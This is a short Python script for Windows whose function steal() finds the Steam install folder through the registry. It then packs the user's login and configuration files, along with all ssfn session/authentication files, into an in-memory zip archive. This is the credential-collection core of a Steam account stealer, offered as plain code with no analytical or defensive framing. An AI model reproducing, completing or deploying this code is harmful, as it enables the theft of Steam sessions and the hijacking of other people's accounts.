import winreg
import io
import os
import glob
from zipfile import ZipFile

def getRegistry(path):
    path = path.replace("/", "\\")
    reg, path = path.split("\\", 1)
    reg = getattr(winreg, reg)
    reg = winreg.ConnectRegistry(None, reg)
    
    path = winreg.OpenKey(reg, path)

    result = {}
    try:
        i = 0
        while 1:
            name, value, type = winreg.EnumValue(path, i)
            result[name] = value
            i += 1
    except WindowsError:
        pass

    return result

def getValue(path, key, default=None):
    return getRegistry(path).get(key, default)

def steal():
    try:
        steam_path = getValue(r"HKEY_LOCAL_MACHINE\SOFTWARE\Valve\SteamService", "installpath_default")
    except:
        steam_path = getValue(r"HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Valve\SteamService", "installpath_default")

    config_path = os.path.join(steam_path, "config")

    archive = io.BytesIO()

    with ZipFile(archive, "w") as zipObj:
        zipObj.write(os.path.join(config_path, "loginusers.vdf"), r"config\loginusers.vdf")
        zipObj.write(os.path.join(config_path, "config.vdf"), r"config\config.vdf")
        zipObj.write(os.path.join(config_path, "steamapps.vrmanifest"), r"config\steamapps.vrmanifest")

        #Find ssfn files
        ssfn_map = glob.iglob(os.path.join(steam_path , "ssfn*"))
        for file in ssfn_map:
            if os.path.isfile(file):
                local_path = file[len(steam_path):]
                zipObj.write(file, local_path)

    archive.seek(0)

    return archive